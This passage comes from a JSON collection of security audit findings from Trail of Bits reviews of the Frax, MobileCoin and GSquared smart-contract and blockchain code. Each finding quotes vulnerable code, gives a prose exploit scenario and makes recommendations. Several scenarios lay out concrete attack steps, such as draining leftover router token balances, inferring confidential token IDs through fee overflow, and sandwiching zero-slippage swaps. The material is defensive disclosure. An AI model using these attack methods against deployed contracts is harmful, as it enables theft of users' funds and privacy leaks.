"Severity: Medium", "Difficulty: Medium"]}, {"title": "25. Setting collateral values manually is error-prone ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf", "body": "During the audit, the Frax Solidity team indicated that collateral located on non-mainnet chains is included in FRAX.globalCollateralValue in FRAXStablecoin , the Ethereum mainnet contract . (As indicated in TOB-FRSOL-023 , this collateral cannot currently be redeemed by users.) Using a script, the team aggregates collateral prices from across multiple chains and contracts and then posts that data to ManualTokenTrackerAMO by calling setDollarBalances . Since we did not have the opportunity to review the script and these contracts were out of scope, we cannot speak to the security of this area of the system. Other issues with collateral accounting and pricing indicate that this process needs review. Furthermore, considering the following issues, this privileged role and architecture signicantly increases the attack surface of the protocol and the likelihood of a hazard:     The correctness of the script used to calculate the data has not been reviewed, and users cannot audit or verify this data for themselves. The conguration of the Frax Protocol is highly complex, and we are not aware of how these interactions are tracked. It is possible that collateral can be mistakenly counted more than once or not at all. The reliability of the script and the frequency with which it is run is unknown. In times of market volatility, it is not clear whether the script will function as anticipated and be able to post updates to the mainnet. This role is not explained in the documentation or contracts, and it is not clear what guarantees users have regarding the collateralization of FRAX (i.e., what is included and updated). As of December 20, 2021, collatDollarBalance has not been updated since November 13, 2021 , and is equivalent to fraxDollarBalanceStored . This indicates that FRAX.globalCollateralValue is both out of date and incorrectly counts FRAX as collateral (see TOB-FRSOL-024 ). Recommendations Short term, include only collateral that can be valued natively on the Ethereum mainnet and do not include collateral that cannot be redeemed in FRAX.globalCollateralValue . Long term, document and follow rigorous processes that limit risk and provide condence to users. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "1. Project contains vulnerable dependencies ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-mobilecoin-securityreview.pdf", "body": "Running cargo-audit over the codebase revealed that the system under audit uses crates with Rust Security (RustSec) advisories and crates that are no longer maintained. RustSec ID", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "2. MobileCoin Foundation could infer token IDs in certain scenarios ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-mobilecoin-securityreview.pdf", "body": "The MobileCoin Foundation is the recipient of all transaction fees and, in certain scenarios, could infer the token ID used in one of multiple transactions included in a block. MCIP-0025 introduced the concept of condential token IDs. The rationale behind the proposal is to allow the MobileCoin network to support tokens other than MOB (MobileCoins native token) in the future. Doing so requires not only that these tokens be unequivocally identiable but also that transactions involving any token, MOB or otherwise, have the same condentiality properties. Before the introduction of the condential tokens feature, all transaction fees were aggregated by the enclave, which created a single transaction fee output per block; however, the same approach applied to a system that supports transfers of tokens other than MOB could introduce information leakage risks. For example, if two users submit two transactions with the same token ID, there would be a single transaction fee output, and therefore, both users would know that they transacted with the same token. To prevent such a leak of information, MCIP-0025 proposes the following: The number of transaction fee outputs on a block should always equal the minimum value between the number of token IDs and the number of transactions in that block (e.g., num_tx_fee_out = min(num_token_ids, num_transactions)). This essentially means that a block with a single transaction will still have a single transaction fee output, but a block with multiple transactions with the same token ID will have multiple transaction fee outputs, one with the aggregated fee and the others with a zero-value fee. Finally, it is worth mentioning that transaction fees are not paid in MOB but in the token that is being transacted; this creates a better user experience, as users do not need to own MOB to send tokens to other people. While this proposal does indeed preserve the condentiality requirement, it falls short in one respect: the receiver of all transaction fees in the MobileCoin network is the MobileCoin Foundation, meaning that it will always know the token ID corresponding to a transaction fee output. Therefore, if only a single token is used in a block, the foundation will know the token ID used by all of the transactions in that block. Exploit Scenario Alice and Bob use the MobileCoin network to make payments between them. They send each other multiple payments, using the same token, and their transactions are included in a single block. Eve, who has access to the MobileCoin Foundations viewing key, is able to decrypt the transaction fee outputs corresponding to that block and, because no other token was used inside the block, is able to infer the token that Alice and Bob used to make the payments. Recommendations Short term, document the fact that transaction token IDs are visible to the MobileCoin Foundation. Transparency on this issue will help users understand the information that is visible by some parties. Additionally, consider implementing the following alternative designs:  Require that all transaction fees be paid in MOB. This solution would result in a degraded user experience compared to the current design; however, it would address the issue at hand.  Aggregate fee outputs across multiple blocks. This solution would achieve only probabilistic condentiality of information because if all those blocks transact in the same token, the foundation would still be able to infer the ID. Long term, document the trade-os between allowing users to pay fees in the tokens they transact with and restricting fee payments to only MOB, and document how these trade-os could aect the condentiality of the system.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "3. Token IDs are protected only by SGX ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-mobilecoin-securityreview.pdf", "body": "Token IDs are intended to be condential. However, they are operated on within an SGX enclave. This is an apparent departure from MobileCoins previous approach of using SGX as an additional security mechanism, not a primary one. Previously, most condential information in MobileCoin was protected by SGX and another security mechanism. Examples include the following:  A transactions senders, recipients, and amounts are protected by SGX and ring signatures.  The transactions a user interacts with through Fog are protected by both SGX and oblivious RAM. However, token IDs are protected by SGX alone. (An example in which a token ID is operated on within an enclave appears in gure 3.1.) Thus, the incorporation of condential tokens seems to represent a shift in MobileCoins security posture. let token_id = TokenId::from(tx.prefix.fee_token_id); let minimum_fee = ct_min_fees .get(&token_id) .ok_or(TransactionValidationError::TokenNotYetConfigured)?; Figure 3.1: consensus/enclave/impl/src/lib.rs#L239-L243 Exploit Scenario Mallory learns of a vulnerability that allows her to see inside of an SGX enclave. Mallory uses the vulnerability to observe the token IDs used in transactions in a MobileCoin enclave that she runs. Recommendations Short term, document the fact that token IDs are not oered the same level of security as other aspects of MobileCoin. This will help set users expectations regarding the condentiality of their information (i.e., whether it could be revealed to an attacker). Long term, continue to investigate solutions to the security problems surrounding the condential tokens feature. A solution that does not reveal token IDs to the enclave could exist.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "4. Nonces are not stored per token ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-mobilecoin-securityreview.pdf", "body": "Mint and mint conguration transaction nonces are not distinguished by the tokens with which they are associated. Malicious minters or governors could use this fact to conduct denial-of-service attacks against other minters and governors. The relevant code appears in gures 4.1 and 4.2. For each type of transaction, nonces are inserted into a seen_nonces set without regard to the token indicated in the transaction. let mut seen_nonces = BTreeSet::default(); let mut validated_txs = Vec::with_capacity(mint_config_txs.len()); for tx in mint_config_txs { // Ensure all nonces are unique. if !seen_nonces.insert(tx.prefix.nonce.clone()) { return Err(Error::FormBlock(format!( \"Duplicate MintConfigTx nonce: {:?}\", tx.prefix.nonce ))); } Figure 4.1: consensus/enclave/impl/src/lib.rs#L342-L352 let mut mint_txs = Vec::with_capacity(mint_txs_with_config.len()); let mut seen_nonces = BTreeSet::default(); for (mint_tx, mint_config_tx, mint_config) in mint_txs_with_config { // The nonce should be unique. if !seen_nonces.insert(mint_tx.prefix.nonce.clone()) { return Err(Error::FormBlock(format!( \"Duplicate MintTx nonce: {:?}\", mint_tx.prefix.nonce ))); } Figure 4.2: consensus/enclave/impl/src/lib.rs#L384-L393 Note that the described attack could be made worse by how nonces are intended to be used. The following passage from the white paper suggests that nonces are generated deterministically from public data. Generating nonces in this way could make them easy for an attacker to predict. When submitting a MintTx, we include a nonce to protect against replay attacks, and a tombstone block to prevent the transaction from being nominated indenitely, and these are committed to the chain. (For example, in a bridge application, this nonce may be derived from records on the source chain, to ensure that each deposit on the source chain leads to at most one mint.) Exploit Scenario Mallory (a minter) learns that Alice (another minter) intends to submit a mint transaction with a particular nonce. Mallory submits a mint transaction with that nonce rst, making Alices invalid. Recommendations Short term, store nonces per token, instead of all together. Doing so will prevent the denial-of-service attack described above. Long term, when adding new data to blocks or to the blockchain conguration, carefully consider whether it should be stored per token. Doing so could help to prevent denial-of-service attacks.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "5. Clients have no option for verifying blockchain conguration ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-mobilecoin-securityreview.pdf", "body": "Clients have no way to verify whether the MobileCoin node they connect to is using the correct blockchain conguration. This exposes users to attacks, as detailed in the white paper: Similarly to how the nodes ensure that they are similarly congured during attestation, (by mixing a hash of their conguration into the responder id used during attestation), the peer- to-node attestation channels could also do this, so that users can fail to attest immediately if malicious manipulation of conguration has occurred. The problem with this approach is that the users have no particularly good source of truth around the correct runtime conguration of the services. The problem that users have no particularly good source of truth could be solved by publishing the latest blockchain conguration via a separate channel (e.g., a publicly accessible server). Furthermore, allowing users to opt in to such additional checks would provide additional security to users who desire it. Exploit Scenario Alice falls victim to the attack described in the white paper. The attack would have been thwarted had Alice known that the node she connected to was not using the correct blockchain conguration. Recommendations Short term, make the current blockchain conguration publicly available, and allow nodes to attest to clients using their conguration. Doing so will help security-conscious users to better protect themselves. Long term, avoid withholding data from clients during attestation. Adopt a general principle that if data should be included in node-to-node attestation, then it should be included in node-to-client attestation as well. Doing so will help to ensure the security of users.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "6. Condential tokens cannot support frequent price swings ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-mobilecoin-securityreview.pdf", "body": "The method for determining tokens minimum fees has limited applicability. In particular, it cannot support tokens whose prices change frequently. In principle, a tokens minimum fee should be comparable in value to the MOB minimum fee. Thus, if a tokens price increases relative to the price of MOB, the tokens minimum fee should decrease. Similarly, if a tokens price decreases relative to the price of MOB, the tokens minimum fee should increase. However, an enclave sets its fee map from the blockchain conguration during initialization (gure 6.1) and does not change the fee map thereafter. Thus, the enclave would seem to have to be restarted if its blockchain conguration and fee map were to change. This fact implies that the current setup cannot support tokens whose prices shift frequently. fn enclave_init( &self, peer_self_id: &ResponderId, client_self_id: &ResponderId, sealed_key: &Option<SealedBlockSigningKey>, blockchain_config: BlockchainConfig, ) -> Result<(SealedBlockSigningKey, Vec<String>)> { // Check that fee map is actually well formed FeeMap::is_valid_map(blockchain_config.fee_map.as_ref()).map_err(Error::FeeMap)?; // Validate governors signature. if !blockchain_config.governors_map.is_empty() { let signature = blockchain_config .governors_signature .ok_or(Error::MissingGovernorsSignature)?; let minting_trust_root_public_key = Ed25519Public::try_from(&MINTING_TRUST_ROOT__KEY[..]) .map_err(Error::ParseMintingTrustRootPublicKey)?; minting_trust_root_public_key .verify_governors_map(&blockchain_config.governors_map, &signature) .map_err(|_| Error::InvalidGovernorsSignature)?; } self.ct_min_fee_map .set(Box::new( blockchain_config.fee_map.as_ref().iter().collect(), )) .expect(\"enclave was already initialized\"); Figure 6.1: consensus/enclave/impl/src/lib.rs#L454-L483 Exploit Scenario MobileCoin integrates token T. The value of T decreases, but the minimum fee remains the same. Users pay the minimum fee, resulting in lost income to the MobileCoin Foundation. Recommendations Short term, accept only tokens with a history of price stability. Doing so will ensure that the new features are used only with tokens that can be supported. Long term, consider including two inputs in each transaction, one for the token transferred and one to pay the fee in MOB, as suggested in TOB-MCCT-2.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "7. Overow handling could allow recovery of transaction token ID ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-mobilecoin-securityreview.pdf", "body": "The systems fee calculation could overow a u64 value. When this occurs, the fee is divided up into multiple smaller fees, each tting into a u64 value. Under certain conditions, this behavior could be abused to reveal whether a token ID is used in a block. The relevant code appears in gure 7.1. The hypothetical attack is described in the exploit scenario below. loop { let output_fee = min(total_fee, u64::MAX as u128) as u64; outputs.push(mint_output( config.block_version, &fee_recipient, FEES_OUTPUT_PRIVATE_KEY_DOMAIN_TAG.as_bytes(), parent_block, &transactions, Amount { value: output_fee, token_id, }, outputs.len(), )); total_fee -= output_fee as u128; if total_fee == 0 { break; } } Figure 7.1: consensus/enclave/impl/src/lib.rs#L855-L873 Exploit Scenario Mallory is a (malicious) minter of token T. Suppose B is a recently minted block whose total number of fee outputs is equal to the number of tokens, which is less than the number of transactions in B. Further suppose that Mallory wishes to determine whether B contains a transaction involving T. Mallory does the following: 1. She puts her node into its state just prior to the minting of B. 2. She mints to herself a quantity of T worth u64::MAX / min_fee * min_fee. Call this quantity F. 3. She submits to her node a transaction with a fee of F. 4. She allows the block to be minted. 5. She observes the number of fee outputs in the modied block, B: a. b. If B does not contain a transaction involving T, then B contains a fee output for T equal to zero, and B contains a fee output for T equal to F. If B does contain a transaction involving T, then B contains a fee output for T equal to at least min_fee, and B contains two fee outputs for T, one of which is equal to u64::MAX. Thus, by observing the number of outputs in B, Mallory can determine whether B contains a transaction involving T. Recommendations Short term, require the total supply of all incorporated tokens not to exceed a u64 value. Doing so will eliminate the possibility of overow and prevent the attack described above. Long term, consider incorporating randomness into the number of fee outputs generated. This could provide an alternative means of preventing the attack in a way that still allows for overow. Alternatively, consider including two inputs in each transaction, one for the token transferred and one to pay the fee in MOB, as suggested in TOB-MCCT-2.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "1. Unbounded loop can cause denial of service ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "Under certain conditions, the withdrawal code will loop, permanently blocking users from getting their funds. The beforeWithdraw function runs before any withdrawal to ensure that the vault has sucient assets. If the vault reserves are insucient to cover the withdrawal, it loops over each strategy, incrementing the _ strategyId pointer value with each iteration, and withdrawing assets to cover the withdrawal amount. 643 644 645 646 { 647 function beforeWithdraw ( uint256 _assets , ERC20 _token) internal returns ( uint256 ) // If reserves dont cover the withdrawal, start withdrawing from strategies 648 649 650 651 652 653 654 655 656 657 658 659 660 661 662 if (_assets > _token.balanceOf( address ( this ))) { uint48 _strategyId = strategyQueue.head; while ( true ) { address _strategy = nodes[_strategyId].strategy; uint256 vaultBalance = _token.balanceOf( address ( this )); // break if we have withdrawn all we need if (_assets <= vaultBalance) break ; uint256 amountNeeded = _assets - vaultBalance; StrategyParams storage _strategyData = strategies[_strategy]; amountNeeded = Math.min(amountNeeded, _strategyData.totalDebt); // If nothing is needed or strategy has no assets, continue if (amountNeeded == 0 ) { continue ; } Figure 1.1: The beforeWithdraw function in GVault.sol#L643-662 However, during an iteration, if the vault raises enough assets that the amount needed by the vault becomes zero or that the current strategy no longer has assets, the loop would keep using the same strategyId until the transaction runs out of gas and fails, blocking the withdrawal. Exploit Scenario Alice tries to withdraw funds from the protocol. The contract may be in a state that sets the conditions for the internal loop to run indenitely, resulting in the waste of all sent gas, the failure of the transaction, and blocking all withdrawal requests. Recommendations Short term, add logic to i ncrement the _strategyId variable to point to the next strategy in the StrategyQueue before the continue statement. Long term, use unit tests and fuzzing tools like Echidna to test that the protocol works as expected, even for edge cases.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "2. Lack of two-step process for contract ownership changes ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "The setOwner() function is used to change the owner of the PnLFixedRate contract. Transferring ownership in one function call is error-prone and could result in irrevocable mistakes. function setOwner ( address _owner ) external { if ( msg.sender != owner) revert PnLErrors.NotOwner(); address previous_owner = msg.sender ; owner = _owner; emit LogOwnershipTransferred(previous_owner, _owner); 56 57 58 59 60 61 62 } Figure 2.1: contracts/pnl/PnLFixedRate:56-62 This issue can also be found in the following locations:  contracts/pnl/PnL.sol:36-42  contracts/strategy/ConvexStrategy.sol:447-453  contracts/strategy/keeper/GStrategyGuard.sol:92-97  contracts/strategy/stop-loss/StopLossLogic.sol:73-78 Exploit Scenario The owner of the PnLFixedRate contract is a governance-controlled multisignature wallet. The community agrees to change the owner of the strategy, but the wrong address is mistakenly provided to its call to setOwner , permanently misconguring the system. Recommendations Short term, implement a two-step process to transfer contract ownership, in which the owner proposes a new address and then the new address executes a call to accept the role, completing the transfer. Long term, review how critical operations are implemented across the codebase to make sure they are not error-prone.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "3. Non-zero token balances in the GRouter can be stolen ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "A non-zero balance of 3CRV, DAI, USDC, or USDT in the router contract can be stolen by an attacker. The GRouter contract is the entrypoint for deposits into a tranche and withdrawals out of a tranche. A deposit involves depositing a given number of a supported stablecoin (USDC, DAI, or USDT); converting the deposit, through a series of operations, into G3CRV, the protocols ERC4626-compatible vault token; and depositing the G3CRV into a tranche. Similarly, for withdrawals, the user burns their G3CRV that was in the tranche and, after a series of operations, receives back some amount of a supported stablecoin (gure 3.1). ERC20( address (tranche.getTrancheToken(_tranche))).safeTransferFrom( ); // withdraw from tranche // index is zero for ETH mainnet as their is just one yield token // returns usd value of withdrawal ( uint256 vaultTokenBalance , ) = tranche.withdraw( function withdrawFromTrancheForCaller ( msg.sender , address ( this ), _amount uint256 _amount , uint256 _token_index , bool _tranche , uint256 _minAmount 421 422 423 424 425 426 ) internal returns ( uint256 amount ) { 427 428 429 430 431 432 433 434 435 436 437 438 439 440 441 442 443 444 445 446 447 _amount, 0 , _tranche, address ( this ) vaultTokenBalance, address ( this ), address ( this ) ); ); // withdraw underlying from GVault uint256 underlying = vaultToken.redeem( 448 449 450 451 452 453 454 455 456 457 458 459 460 461 462 463 464 465 466 467 468 } // remove liquidity from 3crv to get desired stable from curve threePool.remove_liquidity_one_coin( underlying, int128 ( uint128 (_token_index)), //value should always be 0,1,2 0 ); ERC20 stableToken = ERC20(routerOracle.getToken(_token_index)); amount = stableToken.balanceOf( address ( this )); if (amount < _minAmount) { revert Errors.LTMinAmountExpected(); } // send stable to user stableToken.safeTransfer( msg.sender , amount); emit LogWithdrawal( msg.sender , _amount, _token_index, _tranche, amount); Figure 3.1: The withdrawFromTrancheForCaller function in GRouter.sol#L421-468 However, notice that during withdrawals the amount of stableTokens that will be transferred back to the user is a function of the current stableToken balance of the contract (see the highlighted line in gure 3.1). In the expected case, the balance should be only the tokens received from the threePool.remove_liquidity_one_coin swap (see L450 in gure 3.1). However, a non-zero balance could also occur if a user airdrops some tokens or they transfer tokens by mistake instead of calling the expected deposit or withdraw functions. As long as the attacker has at least 1 wei of G3CRV to burn, they are capable of withdrawing the whole balance of stableToken from the contract, regardless of how much was received as part of the threePool swap. A similar situation can happen with deposits. A non-zero balance of G3CRV can be stolen as long as the attacker has at least 1 wei of either DAI, USDC, or USDT. Exploit Scenario Alice mistakenly sends a large amount of DAI to the GRouter contract instead of calling the deposit function. Eve notices that the GRouter contract has a non-zero balance of DAI and calls withdraw with a negligible balance of G3CRV. Eve is able to steal Alice's DAI at a very small cost. Recommendations Short term, consider using the dierence between the contracts pre- and post-balance of stableToken for withdrawals, and depositAmount for deposits, in order to ensure that only the newly received tokens are used for the operations. Long term, create an external skim function that can be used to skim any excess tokens in the contract. Additionally, ensure that the user documentation highlights that users should not transfer tokens directly to the GRouter and should instead use the web interface or call the deposit and withdraw functions. Finally, ensure that token airdrops or unexpected transfers can only benet the protocol.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Medium"]}, {"title": "4. Uninformative implementation of maxDeposit and maxMint from EIP-4626 ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "The GVault implementation of EIP-4626 is uninformative for maxDeposit and maxMint, as they return only xed, extreme values. EIP-4626 is a standard to implement tokenized vaults. In particular, the following is specied:  maxDeposit : MUST factor in both global and user-specic limits, like if deposits are entirely disabled (even temporarily) it MUST return 0. MUST return 2 ** 256 - 1 if there is no limit on the maximum amount of assets that may be deposited.  maxMint : MUST factor in both global and user-specic limits, like if mints are entirely disabled (even temporarily) it MUST return 0. MUST return 2 ** 256 - 1 if there is no limit on the maximum amount of assets that may be deposited. The current implementation of maxDeposit and maxMint in the GVault contract directly return the maximum value of the uint256 type: /// @notice The maximum amount a user can deposit into the vault function maxDeposit ( address ) public pure override returns ( uint256 maxAssets ) return type( uint256 ).max; 293 294 295 296 297 298 299 { 300 301 } . . . 315 316 317 318 } /// @notice maximum number of shares that can be minted function maxMint ( address ) public pure override returns ( uint256 maxShares ) { return type( uint256 ).max; Figure 4.1: The maxDeposit and maxMint functions from GVault.sol This implementation, however, does not provide any valuable information to the user and may lead to faulty integrations with third-party systems. Exploit Scenario A third-party protocol wants to deposit into a GVault . It rst calls maxDeposit to know the maximum amount of asserts it can deposit and then calls deposit . However, the latter function call will revert because the value is too large. Recommendations Short term, return suitable values in maxDeposit and maxMint by considering the amount of assets owned by the caller as well any other global condition (e.g., a contract is paused). Long term, ensure compliance with the EIP specication that is being implemented (in this case, EIP-4626).", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "5. moveStrategy runs of out gas for large inputs ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "Reordering strategies can trigger operations that will run out-of-gas before completion. A GVault contract allows dierent strategies to be added into a queue. Since the order of them is important, the contract provides moveStrategy , a function to let the owner to move a strategy to a certain position of the queue. 500 501 502 503 504 505 506 507 508 509 510 511 } /// @notice Move the strategy to a new position /// @param _strategy Target strategy to move /// @param _pos desired position of strategy /// @dev if the _pos value is >= number of strategies in the queue, /// the strategy will be moved to the tail position function moveStrategy ( address _strategy , uint256 _pos ) external onlyOwner { uint256 currentPos = getStrategyPositions(_strategy); uint256 _strategyId = strategyId[_strategy]; if (currentPos > _pos) move( uint48 (_strategyId), uint48 (currentPos - _pos), false ); else move( uint48 (_strategyId), uint48 (_pos - currentPos), true ); Figure 5.1: The moveStrategy function from GVault.sol The documentation states that if the position to move a certain strategy is larger than the number of strategies in the queue, then it will be moved to the tail of the queue. This implemented using the move function: 171 172 173 174 175 176 177 178 179 180 181 182 ) internal { /// @notice move a strategy to a new position in the queue /// @param _id id of strategy to move /// @param _steps number of steps to move the strategy /// @param _back move towards tail (true) or head (false) /// @dev Moves a strategy a given number of steps. If the number /// of steps exceeds the position of the head/tail, the /// strategy will take the place of the current head/tail function move ( uint48 _id , uint48 _steps , bool _back 183 184 185 186 187 188 189 190  Strategy storage oldPos = nodes[_id]; if (_steps == 0 ) return ; if (oldPos.strategy == ZERO_ADDRESS) revert NoIdEntry(_id); uint48 _newPos = !_back ? oldPos.prev : oldPos.next; for ( uint256 i = 1 ; i < _steps; i++) { _newPos = !_back ? nodes[_newPos].prev : nodes[_newPos].next; } Figure 5.2: The header of the move function from StrategyQueue.sol However, if a large number of steps is used, the loop will never nish without running out of gas. A similar issue aects StrategyQueue.withdrawalQueue , if called directly. Exploit Scenario Alice creates a smart contract that acts as the owner of a GVault. She includes code to reorder strategies using a call to moveStrategy . Since she wants to ensure that a certain strategy is always moved to the end of the queue, she uses a very large value as the position. When the code runs, it will always run out of gas, blocking the operation. Recommendations Short term, ensure the execution of the move ends in a number of steps that is bounded by the number of strategies in the queue. Long term, use unit tests and fuzzing tools like Echidna to test that the protocol works as expected, even for edge cases.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "6. GVault withdrawals from ConvexStrategy are vulnerable to sandwich attacks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "Token swaps that may be executed during vault withdrawals are vulnerable to sandwich attacks. Note that this is applicable only if a user withdraws directly from the GVault , not through the GRouter contract. The ConvexStrategy contract performs token swaps through Uniswap V2, Uniswap V3, and Curve. All platforms allow the caller to specify the minimum-amount-out value, which indicates the minimum amount of tokens that a user wishes to receive from a swap. This provides protection against illiquid pools and sandwich attacks. Many of the swaps that the ConvexStrategy contract performs have the minimum-amount-out value hardcoded to zero. But a majority of these swaps can be triggered only by a Gelato keeper, which uses a private channel to relay all transactions. Thus, these swaps cannot be sandwiched. However, this is not the case with the ConvexStrategy.withdraw function. The withdraw function will be called by the GVault contract if the GVault does not have enough tokens for a user withdrawal. If the balance is not sucient, ConvexStrategy.withdraw will be called to retrieve additional assets to complete the withdrawal request. Note that the transaction to withdraw assets from the protocol will be visible in the public mempool (gure 6.1). function withdraw ( uint256 _amount ) 771 772 773 774 { 775 776 777 778 779 780 781 782 783 784 785 external returns ( uint256 withdrawnAssets , uint256 loss ) if ( msg.sender != address (VAULT)) revert StrategyErrors.NotVault(); ( uint256 assets , uint256 balance , ) = _estimatedTotalAssets( false ); // not enough assets to withdraw if (_amount >= assets) { balance += sellAllRewards(); balance += divestAll( false ); if (_amount > balance) { loss = _amount - balance; withdrawnAssets = balance; } else { withdrawnAssets = _amount; 786 787 788 789 790 791 792 793 794 795 796 797 798 799 800 801 802 803 804 805 806 807 808 809 810 811 812 } } } else { // check if there is a loss, and distribute it proportionally // if it exists uint256 debt = VAULT.getStrategyDebt(); if (debt > assets) { loss = ((debt - assets) * _amount) / debt; _amount = _amount - loss; } if (_amount <= balance) { withdrawnAssets = _amount; } else { withdrawnAssets = divest(_amount - balance, false ) + balance; if (withdrawnAssets < _amount) { loss += _amount - withdrawnAssets; } else { if (loss > withdrawnAssets - _amount) { loss -= withdrawnAssets - _amount; } else { loss = 0 ; } } } } ASSET.transfer( msg.sender , withdrawnAssets); return (withdrawnAssets, loss); Figure 6.1: The withdraw function in ConvexStrategy.sol#L771-812 In the situation where the _amount that needs to be withdrawn is more than or equal to the total number of assets held by the contract, the withdraw function will call sellAllRewards and divestAll with _ slippage set to false (see the highlighted portion of gure 6.1). The sellAllRewards function, which will call _sellRewards , sells all the additional reward tokens provided by Convex, its balance of CRV, and its balance of CVX for WETH. All these swaps have a hardcoded value of zero for the minimum-amount-out. Similarly, if _ slippage is set to false when calling divestAll , the swap species a minimum-amount-out of zero. By specifying zero for all these token swaps, there is no guarantee that the protocol will receive any tokens back from the trade. For example, if one or more of these swaps get sandwiched during a call to withdraw , there is an increased risk of reporting a loss that will directly aect the amount the user is able to withdraw. Exploit Scenario Alice makes a call to withdraw to remove some of her funds from the protocol. Eve notices this call in the public transaction mempool. Knowing that the contract will have to sell some of its rewards, Eve identies a pure prot opportunity and sandwiches one or more of the swaps performed during the transaction. The strategy now has to report a loss, which results in Alice receiving less than she would have otherwise. Recommendations Short term, for _sellRewards , use the same minAmount calculation as in divestAll but replace debt with the contracts balance of a given reward token. This can be applied for all swaps performed in _sellRewards . For divestAll , set _slippage to true instead of false when it is called in withdraw . Long term, document all cases in which front-running may be possible and its implications for the codebase. Additionally, ensure that all users are aware of the risks of front-running and arbitrage when interacting with the GSquared system.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "7. Stop loss primer cannot be deactivated ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "The stop loss primer cannot be deactivated because the keeper contract uses the incorrect function to check whether or not the meta pool has become healthy again. The stop loss primer is activated if the meta pool that is being used for yield becomes unhealthy. A meta pool is unhealthy if the price of the 3CRV token deviates from the expected price for a set amount of time. The primer can also be deactivated if, after it has been activated, the price of the token stabilizes back to a healthy value. Deactivating the primer is a critical feature because if the pool becomes healthy again, there is no reason to divest all of the strategys funds, take potential losses, and start all over again. The GStrategyResolver contract, which is called by a Gelato keeper, will check to identify whether a primer can be deactivated. This is done via the taskStopStopLossPrimer function. The function will attempt to call the GStrategyGuard.endStopLoss function to see whether the primer can be deactivated (gure 7.1). function taskStopStopLossPrimer () external view returns ( bool canExec , bytes memory execPayload) IGStrategyGuard executor = IGStrategyGuard(stopLossExecutor); if (executor.endStopLoss()) { canExec = true ; execPayload = abi.encodeWithSelector( executor.stopStopLossPrimer.selector ); } 46 47 48 49 50 { 51 52 53 54 55 56 57 58 } Figure 7.1: The taskStopStopLossPrimer function in GStrategyResolver.sol#L46-58 However, the GStrategyGuard contract does not have an endStopLoss function. Instead, it has a canEndStopLoss function. Note that the executor variable in taskStopStopLossPrimer is expected to implement the IGStrategyGuard function, which does have an endStopLoss function. However, the GStrategyGuard contract implements the IGuard interface, which does not have the endStopLoss function. Thus, the call to endStopLoss will simply return, which is equivalent to returning false , and the primer will not be deactivated. Exploit Scenario Due to market conditions, the price of the 3CRV token drops signicantly for an extended period of time. This triggers the Gelato keeper to activate the stop loss primer. Soon after, the price of the 3CRV token restabilizes. However, because of the incorrect function call in the taskStopStopLossPrimer function, the primer cannot be deactivated, the stop loss process completes, and all the funds in the strategy must be divested. Recommendations Short term, change the function call from endStopLoss to canEndStopLoss in taskStopStopLossPrimer . Long term, ensure that there are no near-duplicate interfaces for a given contract in the protocol that may lead to an edge case similar to this. Additionally, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "8. getYieldTokenAmount uses convertToAssets instead of convertToShares ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf", "body": "The getYieldTokenAmount function does not properly convert a 3CRV token amount into a G3CRV token amount, which may allow a user to withdraw more or less than expected or lead to imbalanced tranches after a migration. The expected behavior of the getYieldTokenAmount function is to return the number of G3CRV tokens represented by a given 3CRV amount. For withdrawals, this will determine how many G3CRV tokens should be returned back to the GRouter contract. For migrations, the function is used to gure out how many G3CRV tokens should be allocated to the senior and junior tranches. To convert a given amount of 3CRV to G3CRV, the GVault.convertToShares function should be used. However, the getYieldTokenAmount function uses the GVault.convertToAssets function (gure 8.1). Thus, getYieldTokenAmount takes an amount of 3CRV tokens and treats it as shares in the GVault , instead of assets. 169 170 171 172 173 { 174 175 } function getYieldTokenAmount ( uint256 _index , uint256 _amount ) internal view returns ( uint256 ) return getYieldToken(_index).convertToAssets(_amount); Figure 8.1: The getYieldTokenAmount function in GTranche.sol#L169-175 If the system is protable, each G3CRV share should be worth more over time. Thus, getYieldTokenAmount will return a value larger than expected because one share is worth more than one asset. This allows a user to withdraw more from the GTranche contract than they should be able to. Additionally, a protable system will cause the senior tranche to receive more G3CRV tokens than expected during migrations. A similar situation can happen if the 